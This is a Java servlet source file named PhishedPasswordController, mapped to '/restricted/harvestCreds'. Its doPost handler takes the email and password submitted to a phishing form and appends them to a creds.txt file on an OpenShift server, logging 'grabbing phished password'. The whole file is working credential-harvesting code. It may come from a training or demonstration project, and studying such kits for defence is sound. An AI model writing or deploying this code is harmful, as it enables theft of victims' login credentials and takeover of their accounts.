package com.acc.controller;

import java.io.FileWriter;
import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/restricted/harvestCreds")
public class PhishedPasswordController extends HttpServlet
{
	
	@Override
	protected void doPost(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException
	{
		System.out.println("grabbing phished password");
		
		String dir = System.getenv("OPENSHIFT_DATA_DIR");
		String path = dir + "creds.txt";
		
		System.out.println("path - " + path);
		
		String name = request.getParameter("Email");
		String pwd = request.getParameter("Password");
		FileWriter writer = new FileWriter(path, true);
		writer.write("\n" + "name = " + name);
		writer.write("\n");
		writer.write("password = " + pwd);
		writer.close();
	}
}
